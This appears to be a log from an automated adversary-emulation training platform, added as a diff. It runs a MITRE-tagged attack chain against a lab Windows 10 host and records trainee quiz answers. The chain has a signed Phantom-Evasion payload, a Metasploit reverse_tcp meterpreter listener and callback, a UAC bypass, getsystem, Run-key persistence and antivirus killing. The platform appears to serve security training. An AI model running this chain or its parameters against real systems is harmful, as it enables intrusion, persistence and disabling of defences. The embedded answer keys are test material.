@@ -1,0 +1,166 @@
+2020-03-31 03:01:35,947- attack-thread - INFO - Property Not Found
+2020-03-31 03:01:36,122- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-31 03:01:36,133- attack-thread - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA04_T1088_P1': {'name': 'bypassuac_sluihijack', 'tactic': 'Privilege_Escalation', 'try_count': 3, 'spawn_seperate_session': False, 'tool': 'metasploit', 'exploit': 'windows/local/bypassuac_sluihijack', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA04_T1134_P1': {'name': 'getsystem', 'tactic': 'Privilege_Escalation', 'try_count': 1, 'spawn_seperate_session': False, 'type': 'command', 'service': 'None', 'tool': 'meterpreter', 'command': 'getsystem'}}, {'TA03_T1060_P2': {'name': 'registry_persistence', 'tactic': 'Persistence', 'try_count': 1, 'spawn_seperate_session': False, 'tool': 'metasploit', 'post': 'windows/local/registry_persistence', 'payload': 'payload windows/x64/meterpreter/reverse_tcp', 'options': {'BLOB_REG_NAME': 'BLOB_REG_NAME_$ref', 'RUN_NAME': 'RUN_NAME_$ref', 'STARTUP': 'SYSTEM', 'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 5, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-31 03:01:36,134- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-31 03:01:36,135- attack-thread - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible', 'metasploit', 'meterpreter', 'metasploit', 'meterpreter']
+2020-03-31 03:01:36,136- attack-thread - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-03-31 03:01:36,137- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 03:01:36,137- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 03:01:36,138- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 03:01:36,139- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 03:01:36,140- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 03:01:36,141- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 03:01:36,141- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 03:01:36,262- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 03:01:36,263- attack-thread - INFO - Reason: payload generation
+2020-03-31 03:01:46,781- attack-thread - INFO - Please insert option: 1
+2020-03-31 03:01:47,439- attack-thread - INFO - Please insert option: 2
+2020-03-31 03:01:47,997- attack-thread - INFO - Please insert option: 2
+2020-03-31 03:01:49,559- attack-thread - INFO - Please insert payload number: 3
+2020-03-31 03:01:49,717- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 03:01:49,874- attack-thread - INFO - Please insert LHOST: 192.168.18.61
+2020-03-31 03:01:49,926- attack-thread - INFO - Please insert LPORT: 43238
+2020-03-31 03:01:49,978- attack-thread - INFO - Please insert output filename: scv_hosts
+2020-03-31 03:01:50,530- attack-thread - INFO - Add multiple processes behaviour: n
+2020-03-31 03:01:51,846- attack-thread - INFO - Strip executable\?: y
+2020-03-31 03:01:53,415- attack-thread - INFO - Sign executable\?: y
+2020-03-31 03:01:53,467- attack-thread - INFO - use already existing certificate: y
+2020-03-31 03:01:53,520- attack-thread - INFO - Select a Certificate: 1
+2020-03-31 03:01:53,571- attack-thread - INFO - Insert sign software description: Microsoft
+2020-03-31 03:01:54,847- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 03:01:55,304- attack-thread - INFO - Please insert option: 0
+2020-03-31 03:01:55,305- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:01:55,306- attack-thread - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-03-31 03:01:55,307- attack-thread - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-03-31 03:02:05,828- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:02:05,828- attack-thread - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-03-31 03:02:05,828- attack-thread - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-03-31 03:02:05,851- attack-thread - INFO - No Exceptions Found
+2020-03-31 03:02:05,889- attack-thread - INFO - post not needed
+2020-03-31 03:02:05,913- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 03:02:05,913- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 03:02:05,944- attack-thread - INFO - cid: 35
+2020-03-31 03:02:05,944- attack-thread - INFO - Starting Another Thread
+2020-03-31 03:02:05,945- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 03:02:07,768- metasploit-thread - INFO - {'job_id': 51, 'uuid': 'pdl9eowa'}
+2020-03-31 03:02:07,774- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:10,797- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:10,950- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:02:10,951- attack-thread - INFO - Appending Generalize questions_answers
+2020-03-31 03:02:10,952- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 03:02:10,952- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 03:02:10,952- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-03-31 03:02:10,953- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 03:02:10,954- attack-thread - INFO - ['192.168.18.61', 43238, '%USERPROFILE%\\Downloads\\', 'scv_hosts']
+2020-03-31 03:02:10,971- attack-thread - INFO - evaluation id:5e826cdce52c551b60c4ba06
+2020-03-31 03:02:10,972- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 03:02:10,991- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-03-31 03:02:10,991- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-03-31 03:02:11,119- attack-thread - INFO - command is scv_hosts.exe
+2020-03-31 03:02:13,831- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:16,857- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:19,886- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:22,887- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-03-31 03:02:22,914- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:25,943- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 03:02:28,959- metasploit-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:02:28,964- metasploit-thread - INFO - Meterpreter Session found in list!, with ID = 24
+2020-03-31 03:02:28,964- metasploit-thread - INFO - ....................Meterpreter Session List...............................
+2020-03-31 03:02:28,969- metasploit-thread - INFO - {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:02:28,969- metasploit-thread - INFO - ....................Connected Meterpreter Session Id: 24....................
+2020-03-31 03:02:49,736- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:02:49,737- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
+2020-03-31 03:02:49,737- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-03-31 03:02:49,760- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 03:02:50,778- attack-thread - INFO - [*] Backgrounding session 24...
+
+2020-03-31 03:02:50,822- attack-thread - INFO - post not needed
+2020-03-31 03:02:50,838- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 03:02:50,839- attack-thread - INFO - Category Not Found
+2020-03-31 03:02:50,839- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 03:02:50,839- attack-thread - INFO - Category Not Found
+2020-03-31 03:02:50,839- attack-thread - INFO - option not found in payloads
+2020-03-31 03:02:50,870- attack-thread - INFO - cid: 36
+2020-03-31 03:02:50,871- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 03:02:51,742- attack-thread - INFO - {'job_id': 52, 'uuid': 'tzka4jk3'}
+2020-03-31 03:02:51,756- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'DESKTOP-VTL34JG\\win_10_1511 @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:02:54,774- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'DESKTOP-VTL34JG\\win_10_1511 @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:02:57,790- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'DESKTOP-VTL34JG\\win_10_1511 @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:00,809- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'DESKTOP-VTL34JG\\win_10_1511 @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:03,844- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'DESKTOP-VTL34JG\\win_10_1511 @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:06,850- attack-thread - INFO - Local exploit executed, re-attaching previous session
+2020-03-31 03:03:06,850- attack-thread - INFO - ....................Meterpreter Session List...............................
+2020-03-31 03:03:06,869- attack-thread - INFO - {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'DESKTOP-VTL34JG\\win_10_1511 @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:06,870- attack-thread - INFO - ....................Connected Meterpreter Session Id: 24....................
+2020-03-31 03:03:06,886- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:03:06,904- attack-thread - WARNING - No Generalized Questions For Privilege_Escalation: TA04_T1088_P1
+2020-03-31 03:03:06,904- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 03:03:06,906- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 03:03:06,907- attack-thread - INFO - {'Question_1': {'Was UAC bypassed?': 'Yes'}}
+2020-03-31 03:03:06,907- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 03:03:06,907- attack-thread - INFO - ['Yes']
+2020-03-31 03:03:06,930- attack-thread - INFO - evaluation id:5e826cdce52c551b60c4ba06
+2020-03-31 03:03:06,931- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 03:03:06,960- attack-thread - INFO - TA04_T1088_P1 has been appended in evaluation
+2020-03-31 03:03:06,960- attack-thread - INFO - ******[Scenario-ID: TA04_T1088_P1Tactic: Privilege_Escalation executed]******
+2020-03-31 03:03:06,980- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 03:03:08,013- attack-thread - INFO - ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+2020-03-31 03:03:08,014- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:03:08,014- attack-thread - WARNING - No Generalized Questions For Privilege_Escalation: TA04_T1134_P1
+2020-03-31 03:03:08,015- attack-thread - WARNING - No scenario-specific questions_answers For Privilege_Escalation: TA04_T1134_P1
+2020-03-31 03:03:08,015- attack-thread - INFO - {}
+2020-03-31 03:03:08,016- attack-thread - WARNING - No questions_answers available
+2020-03-31 03:03:08,016- attack-thread - INFO - ******[Scenario-ID: TA04_T1134_P1Tactic: Privilege_Escalation executed]******
+2020-03-31 03:03:08,040- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 03:03:09,062- attack-thread - INFO - [*] Backgrounding session 24...
+
+2020-03-31 03:03:09,068- attack-thread - INFO - exploit not needed
+2020-03-31 03:03:09,079- attack-thread - INFO - post not needed
+2020-03-31 03:03:11,674- attack-thread - INFO - payload not needed
+2020-03-31 03:03:11,675- attack-thread - INFO - exploit['BLOB_REG_NAME'] not needed...
+2020-03-31 03:03:11,675- attack-thread - INFO - exploit['RUN_NAME'] not needed...
+2020-03-31 03:03:11,675- attack-thread - INFO - exploit['STARTUP'] not needed...
+2020-03-31 03:03:11,675- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 03:03:11,675- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 03:03:11,676- attack-thread - INFO - option not found in payloads
+2020-03-31 03:03:11,676- attack-thread - INFO - option not found in payloads
+2020-03-31 03:03:11,676- attack-thread - INFO - option not found in payloads
+2020-03-31 03:03:11,676- attack-thread - INFO - option not found in payloads
+2020-03-31 03:03:11,715- attack-thread - INFO - cid: 37
+2020-03-31 03:03:11,715- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 03:03:12,629- attack-thread - INFO - {'job_id': 53, 'uuid': 'owgtzjkq'}
+2020-03-31 03:03:12,639- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:15,680- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:18,702- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:21,720- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:24,758- attack-thread - INFO - Meterpreter Sessions {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:27,766- attack-thread - INFO - Local exploit executed, re-attaching previous session
+2020-03-31 03:03:27,767- attack-thread - INFO - ....................Meterpreter Session List...............................
+2020-03-31 03:03:27,772- attack-thread - INFO - {'24': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:43238', 'tunnel_peer': '192.168.18.53:57469', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': 'NT AUTHORITY\\SYSTEM @ DESKTOP-VTL34JG', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 57469, 'target_host': '', 'username': 'root', 'uuid': 'u1n4w7xs', 'exploit_uuid': 'pdl9eowa', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-03-31 03:03:27,772- attack-thread - INFO - ....................Connected Meterpreter Session Id: 24....................
+2020-03-31 03:03:27,777- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:03:27,777- attack-thread - WARNING - No Generalized Questions For Persistence: TA03_T1060_P2
+2020-03-31 03:03:27,777- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 03:03:27,778- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 03:03:27,778- attack-thread - INFO - {'Question_1': {'What is BLOB_REG name?': 'BLOB_REG_NAME_$ref'}, 'Question_2': {'What is Run key name?': 'RUN_NAME_$ref'}, 'Question_3': {'What is attacker listening port for it?': 'LPORT_$ref'}}
+2020-03-31 03:03:27,778- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 03:03:27,778- attack-thread - INFO - ['updateService', 'Telegram', 46563]
+2020-03-31 03:03:27,810- attack-thread - INFO - evaluation id:5e826cdce52c551b60c4ba06
+2020-03-31 03:03:27,810- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 03:03:27,839- attack-thread - INFO - TA03_T1060_P2 has been appended in evaluation
+2020-03-31 03:03:27,839- attack-thread - INFO - ******[Scenario-ID: TA03_T1060_P2Tactic: Persistence executed]******
+2020-03-31 03:03:27,860- attack-thread - INFO - ....................Executing Meterpreter Script.........................
+2020-03-31 03:03:37,926- attack-thread - INFO - Execution Completed
+2020-03-31 03:03:37,927- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 03:03:37,928- attack-thread - WARNING - No Generalized Questions For Defense_Evasion: TA05_T1089_P2
+2020-03-31 03:03:37,928- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 03:03:37,929- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 03:03:37,929- attack-thread - INFO - {'Question_1': {'Which process/application was effected': 'kaspersky'}}
+2020-03-31 03:03:37,930- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 03:03:37,930- attack-thread - INFO - ['kaspersky']
+2020-03-31 03:03:37,950- attack-thread - INFO - evaluation id:5e826cdce52c551b60c4ba06
+2020-03-31 03:03:37,950- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 03:03:37,969- attack-thread - INFO - TA05_T1089_P2 has been appended in evaluation
+2020-03-31 03:03:37,969- attack-thread - INFO - ******[Scenario-ID: TA05_T1089_P2Tactic: Defense_Evasion executed]******
+2020-03-31 03:03:37,970- attack-thread - INFO - ....................Destroying Session.....................................
